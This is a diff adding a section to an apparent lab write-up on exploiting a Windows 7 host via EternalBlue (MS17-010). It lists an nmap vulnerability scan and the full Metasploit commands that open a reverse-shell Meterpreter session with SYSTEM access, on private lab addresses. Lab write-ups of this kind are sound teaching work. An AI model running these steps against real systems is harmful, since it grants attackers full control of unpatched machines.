@@ -15,3 +15,36 @@ This milestone focuses on exploiting a Windows 7 machine using the EternalBlue v
   - nano, cat (for wordlists)
 
 ---
+## 3. Exploitation and Credential Discovery
+
+### 3.1 Exploitation of MS17-010 (EternalBlue)
+
+**Objective:** Gain remote code execution by exploiting a vulnerable SMB service on the Windows 7 target.
+
+**Steps Taken:**
+1. Scanned the target to confirm port 445 is open:
+   ```bash
+   nmap -p 445 --script smb-vuln-ms17-010 192.168.57.20
+   ```
+   - `-p 445` specifies the SMB port.
+   - `--script smb-vuln-ms17-010` runs the NSE script to detect MS17-010 vulnerability.
+
+2. Launched Metasploit and configured the EternalBlue module:
+   ```bash
+   use exploit/windows/smb/ms17_010_eternalblue
+   set RHOST 192.168.57.20
+   set PAYLOAD windows/x64/meterpreter/reverse_tcp
+   set LHOST 192.168.57.10
+   exploit
+   ```
+   - `RHOST`: Target IP address
+   - `LHOST`: Attacker IP address
+   - `PAYLOAD`: Specifies the type of reverse shell
+
+**Results:**
+- The target was confirmed as vulnerable to MS17-010.
+- The exploit succeeded, and a Meterpreter session was opened with SYSTEM-level access.
+
+**Figure 1:** Meterpreter session established post-exploitation.
+
+---
